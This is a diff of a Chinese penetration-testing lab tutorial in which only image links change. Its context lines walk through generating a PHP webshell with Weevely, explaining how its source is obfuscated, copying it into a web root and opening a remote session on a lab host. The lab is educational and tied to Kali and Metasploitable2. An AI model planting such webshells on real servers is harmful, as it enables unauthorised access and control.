@@ -29,7 +29,7 @@
 
 在实验楼实验环境中，一共提供三台主机，其中一个为宿主机 Ubuntu 14.04，另一个为信息安全人士镇家之宝 Kali Linux，最后一个为常做目标靶机的 Metasploitable2。本实验的所有操作都是在 Kali Linux 和 Ubunut 下进行的。对于目标靶机，同学们也可以使用 Metasploitable2 替代，只要目标主机能够提供 PHP 运行的环境即可。
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1481364131797.png-wm)
+![图片描述](../imgs/1481364131797.png-wm.png)
 
 
 ## 二、启动环境
@@ -45,12 +45,12 @@ sudo virsh start Kali
 # 注意，Kali 中 K 为大写字母
 ssh root@Kali
 ```
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481101382249.png-wm)
+![图片描述](../imgs/1481101382249.png-wm_1.png)
 
 **注意：等 Kali 启动，输入命令后，要等待一段时间，再对 Kali 进行连接，否则会报错。**`Kali` 的登录密码为 `toor`，登录成功后，如图所示：
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481101646711.png-wm)
+![图片描述](../imgs/1481101646711.png-wm_1.png)
 
 **可选：** 本实验的实验环境，除了宿主机可以提供 PHP 运行环境外，备用靶机 Metasploitable2 也可以提供 PHP 环境。如果想利用 Metasploitable2 进行挂载 PHP 木马的同学，可以使用如下命令，在宿主主机 Ubuntu 14.04 中开启 Metasploitable2 虚拟机。接着同在 Ubuntu 中的操作一样，只要把木马文件传至目标靶机网站目录下即可。
 
@@ -77,7 +77,7 @@ ssh msfadmin@target
 
 黑客通常使用工具 Weevely 来生成一个 PHP 木马文件，上传到目标主机网站后，用以感染目标主机，建立起攻击机与目标主机之间的联系。当建立起连接后，黑客再对目标主机进行提权，留后门等其它对目标主机有危害的操作。
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1481526381185.png-wm)
+![图片描述](../imgs/1481526381185.png-wm.png)
 
 ##### 3. `Weevely` 的参数含义内容？
 
@@ -88,7 +88,7 @@ ssh msfadmin@target
 weevely
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481009912564.png-wm)
+![图片描述](../imgs/1481009912564.png-wm.png)
 
 上图中显示的各个参数，具体的使用语法如下所示：
 
@@ -123,12 +123,12 @@ weevely generate hello /root/hello.php
 | `/root/hello.php` | 在攻击者的本地环境中，指定生成木马文件的具体位置，这里为 `/root` 文件夹下。 |
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481010650852.png-wm)
+![图片描述](../imgs/1481010650852.png-wm.png)
 
 
 在输入生成 PHP 木马文件命令后，可以看到目录 `/root/`下，已经存在了 PHP 木马文件 `hello.php`：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481010703158.png-wm)
+![图片描述](../imgs/1481010703158.png-wm.png)
 
 对于 PHP 木马的源码，我们可以使用 `cat` 命令查看木马文件，在命令行终端中，输入如下命令：
 
@@ -137,7 +137,7 @@ weevely generate hello /root/hello.php
 cat /root/hello.php
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481010792216.png-wm)
+![图片描述](../imgs/1481010792216.png-wm.png)
 
 
 ### 4.2 解释 PHP 木马源码
@@ -170,7 +170,7 @@ $I=$C('',$x);$I();
 ```
 在源码中，其`变量名`是随机生成的，所以直接查看代码的变量名，很难查找出有什么规律。感兴趣的同学，可以使用不同名字和密码，多生成几组 PHP 木马进行对比验证。在这堆乱码中，有两处非常关键的代码在倒数第二和第三行，在解释这两行代码之前，我们先看一下变量 `$r`：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482975799229.png-wm)
+![图片描述](../imgs/1482975799229.png-wm.png)
 
 ```
 # 处理过的字符串，夹杂着欺骗字符
@@ -185,7 +185,7 @@ $x=str_replace(',l','',$K.$y.$S.$A.$Q.$j.$L.$o.$m.$T.$z.$r);
 ```
 对于插在代码中的欺骗符号之一 `,l`，可以看出有这么多（黄色标记的部分），在箭头一的位置，去掉欺骗字符后，就是一个正常的 `if` 语句：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1481532833765.png-wm)
+![图片描述](../imgs/1481532833765.png-wm.png)
 
 
 其中对于变量 `$r`，洗掉欺骗符号后（箭头二处），得到关键函数 `base64_encode`，作用是使用 base64 对数据进行编码。在变量 `$x` 之上，也就是倒数第三行，变量 `$C` 的字符串经过函数 `str_replace` 清洗的前后对比为：
@@ -212,11 +212,11 @@ scp hello.php shiyanlou@192.168.122.1:/tmp
 ```
 **注意：密码是 `shiyanlou`**
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481011073001.png-wm)
+![图片描述](../imgs/1481011073001.png-wm.png)
 
 实验楼的 Ubuntu 14.04 环境下，浏览器地址栏中输入`127.0.0.1`，默认开启的是 `nginx` 服务。所以我们应该先关掉 `nginx` 服务，开启 `apache` 服务，提供 PHP 运行环境，用以测试 PHP 木马：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480993507282.png-wm)
+![图片描述](../imgs/1480993507282.png-wm_2.png)
 
 ```
 # 关闭 nginx 服务命令
@@ -226,7 +226,7 @@ sudo service nginx stop
 sudo service apache2 start
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480993732499.png-wm)
+![图片描述](../imgs/1480993732499.png-wm_2.png)
 
 
 接着使用复制命令，将 PHP 木马文件，复制到网站的根目录下：
@@ -236,7 +236,7 @@ sudo service apache2 start
 sudo cp /tmp/hello.php /var/www/html/
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480994046645.png-wm)
+![图片描述](../imgs/1480994046645.png-wm.png)
 
 ### 4.4 通过 weevely 创建会话
 
@@ -251,7 +251,7 @@ weevely http://192.168.122.1/hello.php hello
 
 在这里要稍等一会，成功后如下所示：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481011627631.png-wm)
+![图片描述](../imgs/1481011627631.png-wm.png)
 
 ### 4.5 查看系统信息
 
@@ -271,7 +271,7 @@ ls
 ifconfig
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481011843023.png-wm)
+![图片描述](../imgs/1481011843023.png-wm.png)
 
 
 ## 五、总结和思考
@@ -288,7 +288,7 @@ ifconfig
 - PHP 基本语法知识
 - 渗透成功后的验证命令
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1481526381185.png-wm)
+![图片描述](../imgs/1481526381185.png-wm.png)
 
 ## 六、课后作业
 
